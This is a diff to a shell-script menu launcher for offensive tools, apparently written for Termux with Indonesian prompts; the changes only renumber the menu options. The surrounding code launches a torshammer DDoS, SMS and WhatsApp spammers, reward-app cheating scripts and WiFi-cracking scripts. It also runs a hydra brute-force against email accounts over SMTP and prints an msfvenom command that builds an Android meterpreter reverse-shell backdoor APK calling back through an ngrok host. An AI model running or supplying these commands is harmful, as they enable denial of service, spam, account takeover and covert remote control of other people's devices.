@@ -76,40 +76,40 @@ echo $cyan"23).DDoS attack by torshammer"
 echo $red"-----------------------------"
 echo ""
 echo $blue"----------[SPAMMING]----------"
-echo $cyan"25).Spamming"
+echo $cyan"24).Spamming"
 echo $red"-----------------------------"
-echo $cyan"26).Litespam"
+echo $cyan"25).Litespam"
 echo $red"-----------------------------"
-echo $cyan"27).Bom spam"
+echo $cyan"26).Bom spam"
 echo $red"-----------------------------"
-echo $cyan"28).Spam WA"
+echo $cyan"27).Spam WA"
 echo $red"-----------------------------"
-echo $cyan"29).Spam WA 2"
+echo $cyan"28).Spam WA 2"
 echo ""
 echo $blue"----------[NUYUL]----------"
-echo $cyan"30).Nuyul cashtree"
+echo $cyan"29).Nuyul cashtree"
 echo $red"-----------------------------"
-echo $cyan"31).Nuyul kubik"
+echo $cyan"30).Nuyul kubik"
 echo $red"-----------------------------"
-echo $cyan"32).Nuyul caping"
+echo $cyan"31).Nuyul caping"
 echo ""
 echo $blue"----------[BRUTEFORCE]----------"
-echo $cyan"33).Bruteforce email"
+echo $cyan"32).Bruteforce email"
 echo ""
 echo $blue"----------[HACKWIFI]----------"
-echo $cyan"34).Bobol WiFi (root accees)"
+echo $cyan"33).Bobol WiFi (root accees)"
 echo $red"-----------------------------"
-echo $cyan"35).Bobol WiFi wpa/wpa2 psk (root acces)"
+echo $cyan"34).Bobol WiFi wpa/wpa2 psk (root acces)"
 echo $red"-----------------------------"
 echo ""
 echo $blue"----------[INSTALLER]----------"
-echo $cyan"36).Install striker"
+echo $cyan"35).Install striker"
 echo $red"-----------------------------"
-echo $cyan"37).Install metasploit"
+echo $cyan"36).Install metasploit"
 echo $red"-----------------------------"
-echo $cyan"38).Install admin finder"
+echo $cyan"37).Install admin finder"
 echo $red"-----------------------------"
-echo $cyan"39).Install katoolin"
+echo $cyan"38).Install katoolin"
 echo $red"-----------------------------"
 echo ""
 read -p"No. Pilihan:" akm
@@ -540,7 +540,7 @@ cd torshammer
 python2 torshammer.py
 fi
 
-if [ $akm = 25 ] || [ $akm = 25 ]
+if [ $akm = 24 ] || [ $akm = 24 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -563,7 +563,7 @@ ls
 sh sdv.sh
 fi
 
-if [ $akm = 26 ] || [ $akm = 26 ]
+if [ $akm = 25 ] || [ $akm = 25 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -580,7 +580,7 @@ cd LITESPAM
 sh LITESPAM.sh
 fi
 
-if [ $akm = 27 ] || [ $akm = 27 ]
+if [ $akm = 26 ] || [ $akm = 26 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -599,7 +599,7 @@ sh install.sh
 sh gco.sh
 fi
 
-if [ $akm = 28 ] || [ $akm = 28 ]
+if [ $akm = 27 ] || [ $akm = 27 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -618,7 +618,7 @@ cd spam-wa
 php Moreno77.php
 fi
 
-if [ $akm = 29 ] || [ $akm = 29 ]
+if [ $akm = 28 ] || [ $akm = 28 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -639,7 +639,7 @@ ls
 php SpamWa.php
 fi
 
-if [ $akm = 30 ] || [ $akm = 30 ]
+if [ $akm = 29 ] || [ $akm = 29 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -658,7 +658,7 @@ cd cashtree
 nano cashtree.php
 fi
 
-if [ $akm = 31 ] || [ $akm = 31 ]
+if [ $akm = 30 ] || [ $akm = 30 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -679,7 +679,7 @@ nano cfg.php
 ls
 fi
 
-if [ $akm = 32 ] || [ $akm = 32 ]
+if [ $akm = 31 ] || [ $akm = 31 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -698,7 +698,7 @@ cd caping
 php run.php
 fi
 
-if [ $akm = 33 ] || [ $akm = 33 ]
+if [ $akm = 32 ] || [ $akm = 32 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -722,7 +722,7 @@ read smtp
 hydra -l $target -P $file -s $port -S -v -V -t 1 smtp://$smtp $smtp
 fi
 
-if [ $akm = 34 ] || [ $akm = 34 ]
+if [ $akm = 33 ] || [ $akm = 33 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -741,7 +741,7 @@ chmod +x wifi-hacker.sh
 ./wifi-hacker.sh
 fi		
    
-if [ $akm = 35 ] || [ $akm = 35 ]
+if [ $akm = 34 ] || [ $akm = 34 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -759,7 +759,7 @@ cd wifi-hacker
 ./wifi-hacker.sh
 fi
 
-if [ $akm = 36 ] || [ $akm = 36 ]
+if [ $akm = 35 ] || [ $akm = 35 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -780,7 +780,7 @@ pip2 install -r requirements.txt
 python2 striker.py
 fi
 
-if [ $akm = 37 ] || [ $akm = 37 ]
+if [ $akm = 36 ] || [ $akm = 36 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -808,7 +808,7 @@ echo $yellow"$termux-setup-storage"
 echo $yellow"$msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdor.apk"
 fi
 
-if [ $akm = 38 ] || [ $akm = 38 ]
+if [ $akm = 37 ] || [ $akm = 37 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -831,7 +831,7 @@ ls
 python2 admin_panel_finder.py
 fi		
 
-if [ $akm = 39 ] || [ $akm = 39 ]
+if [ $akm = 38 ] || [ $akm = 38 ]
 then
 clear
 echo $red"_______________________________________________"
